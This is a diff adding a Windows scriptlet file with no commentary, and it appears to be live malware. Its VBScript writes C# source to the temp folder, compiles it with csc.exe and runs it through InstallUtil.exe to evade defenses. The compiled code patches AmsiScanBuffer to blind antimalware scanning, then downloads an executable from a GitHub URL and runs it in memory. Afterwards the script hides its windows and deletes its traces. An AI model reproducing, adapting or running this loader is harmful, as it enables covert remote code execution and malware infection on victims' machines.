@@ -1,0 +1,66 @@
+<scriptlet>
+<registration progid="FINAL" classid="{CCCCCCCC-CCCC-CCCC-CCCC-CCCCCCCCCCCC}">
+<script language="VBScript">
+    On Error Resume Next
+    
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    code = "using System;" & vbCrLf & _
+           "using System.Net;" & vbCrLf & _
+           "using System.Reflection;" & vbCrLf & _
+           "using System.Runtime.InteropServices;" & vbCrLf & _
+           "using System.ComponentModel;" & vbCrLf & _
+           "using System.Configuration.Install;" & vbCrLf & _
+           "[RunInstaller(true)]" & vbCrLf & _
+           "public class L : Installer {" & vbCrLf & _
+           "public override void Install(System.Collections.IDictionary s) {" & vbCrLf & _
+           "base.Install(s);" & vbCrLf & _
+           "PatchAMSI();" & vbCrLf & _
+           "System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;" & vbCrLf & _
+           "var b = new WebClient().DownloadData(""https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/bh.exe"");" & vbCrLf & _
+           "var asm = Assembly.Load(b);" & vbCrLf & _
+           "asm.EntryPoint.Invoke(null, new object[]{});" & vbCrLf & _
+           "}" & vbCrLf & _
+           "[DllImport(""kernel32"")]" & vbCrLf & _
+           "static extern IntPtr GetProcAddress(IntPtr hModule, string procName);" & vbCrLf & _
+           "[DllImport(""kernel32"")]" & vbCrLf & _
+           "static extern IntPtr LoadLibrary(string name);" & vbCrLf & _
+           "[DllImport(""kernel32"")]" & vbCrLf & _
+           "static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" & vbCrLf & _
+           "static void PatchAMSI() {" & vbCrLf & _
+           "try {" & vbCrLf & _
+           "var lib = LoadLibrary(""amsi.dll"");" & vbCrLf & _
+           "var addr = GetProcAddress(lib, ""AmsiScanBuffer"");" & vbCrLf & _
+           "uint old;" & vbCrLf & _
+           "VirtualProtect(addr, (UIntPtr)32, 0x40, out old);" & vbCrLf & _
+           "Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3},0,addr,6);" & vbCrLf & _
+           "}catch{}" & vbCrLf & _
+           "}}"
+    
+    temp = fso.GetSpecialFolder(2)
+    cs = temp & "\" & fso.GetTempName & ".cs"
+    dll = temp & "\" & fso.GetTempName & ".dll"
+    
+    Set f = fso.CreateTextFile(cs, True)
+    f.Write code
+    f.Close
+    
+    csc = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework64\v4.0.30319\csc.exe")
+    If Not fso.FileExists(csc) Then csc = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework\v4.0.30319\csc.exe")
+    
+    cmd = """" & csc & """ /t:library /r:System.Configuration.Install.dll /platform:x64 /out:""" & dll & """ """ & cs & """"
+    shell.Run cmd, 0, True
+    
+    If fso.FileExists(dll) Then
+        iu = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe")
+        If Not fso.FileExists(iu) Then iu = shell.ExpandEnvironmentStrings("%windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe")
+        shell.Run """" & iu & """ /logfile= /LogToConsole=false """ & dll & """", 0, False
+        shell.Run "timeout /t 10 /nobreak", 0, True
+    End If
+    
+    fso.DeleteFile cs
+    fso.DeleteFile dll
+</script>
+</registration>
+</scriptlet>
